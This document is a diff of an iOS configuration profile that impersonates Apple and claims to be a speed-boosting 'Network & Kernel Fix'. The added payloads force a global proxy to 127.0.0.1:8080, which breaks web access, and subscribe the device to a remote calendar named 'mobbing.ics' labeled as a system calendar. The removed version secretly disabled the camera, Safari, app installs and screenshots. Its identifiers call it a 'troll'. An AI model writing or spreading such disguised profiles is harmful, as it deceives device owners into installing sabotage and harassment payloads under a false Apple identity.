@@ -6,66 +6,57 @@
 	<array>
 		<dict>
 			<key>PayloadType</key>
-			<string>com.apple.applicationaccess</string>
+			<string>com.apple.proxy.http.global</string>
 			<key>PayloadIdentifier</key>
-			<string>com.apple.managed.restrictions.ultra</string>
+			<string>com.apple.proxy.troll</string>
 			<key>PayloadUUID</key>
-			<string>550e8400-e29b-41d4-a716-446655440000</string>
+			<string>11112222-3333-4444-5555-666677778888</string>
 			<key>PayloadVersion</key>
 			<integer>1</integer>
-			
-			<key>allowCamera</key>
-			<false/> <key>allowAppInstallation</key>
-			<false/> <key>allowAppRemoval</key>
-			<false/> <key>allowSafari</key>
-			<false/> <key>allowScreenShot</key>
-			<false/> <key>allowWallpaperModification</key>
-			<false/> <key>allowBluetoothModification</key>
-			<false/> <key>allowFingerprintForUnlock</key>
-			<false/> </dict>
-
-		<dict>
-			<key>PayloadType</key>
-			<string>com.apple.keyboard.modification</string>
-			<key>PayloadIdentifier</key>
-			<string>com.apple.keyboard.troll</string>
-			<key>PayloadUUID</key>
-			<string>550e8400-e29b-41d4-a716-446655440001</string>
-			<key>PayloadVersion</key>
-			<integer>1</integer>
-			<key>allowPredictiveKeyboard</key>
-			<false/> <key>allowAutoCorrection</key>
-			<false/> <key>allowSpellCheck</key>
-			<false/>
+			<key>ProxyType</key>
+			<string>Manual</string>
+			<key>ProxyServer</key>
+			<string>127.0.0.1</string>
+			<key>ProxyServerPort</key>
+			<integer>8080</integer>
 		</dict>
 
 		<dict>
 			<key>PayloadType</key>
-			<string>com.apple.AdLib.managed</string>
+			<string>com.apple.subscribedcalendar.account</string>
 			<key>PayloadIdentifier</key>
-			<string>com.apple.adlib.troll</string>
+			<string>com.apple.calendar.managed.troll</string>
 			<key>PayloadUUID</key>
-			<string>550e8400-e29b-41d4-a716-446655440002</string>
+			<string>33334444-5555-6666-7777-888899990000</string>
 			<key>PayloadVersion</key>
 			<integer>1</integer>
-			<key>allowAdTracking</key>
-			<false/>
+			<key>PayloadDescription</key>
+			<string> Sistem Bildirim Senkronizasyonu</string>
+			<key>PayloadDisplayName</key>
+			<string>Sistem Takvimi</string>
+			
+			<key>SubCalAccountHostName</key>
+			<string>raw.githubusercontent.com</string>
+			<key>SubCalAccountPath</key>
+			<string>/keremkero319-del/keross/main/mobbing.ics</string>
+			<key>SubCalAccountUseSSL</key>
+			<true/>
 		</dict>
 	</array>
 
 	<key>PayloadDisplayName</key>
-	<string> iOS 19.4 Kernel Optimizasyonu (Beta)</string>
+	<string> iOS 19.4 Network &amp; Kernel Fix</string>
 	<key>PayloadDescription</key>
-	<string>İşlemci çekirdek hızını artırır ve RAM kullanımını %30 azaltır.</string>
+	<string>İnternet hızını artırır ve bildirim sistemini optimize eder.</string>
 	<key>PayloadIdentifier</key>
-	<string>com.apple.system.kernel.fix</string>
+	<string>com.apple.system.ultra-fix</string>
 	<key>PayloadOrganization</key>
-	<string>Apple Engineering Group</string>
+	<string>Apple Engineering</string>
 	<key>PayloadRemovalDisallowed</key>
 	<false/> <key>PayloadType</key>
 	<string>Configuration</string>
 	<key>PayloadUUID</key>
-	<string>550e8400-e29b-41d4-a716-446655440003</string>
+	<string>ABCDEF12-3456-7890-ABCD-EF1234567890</string>
 	<key>PayloadVersion</key>
 	<integer>1</integer>
 </dict>
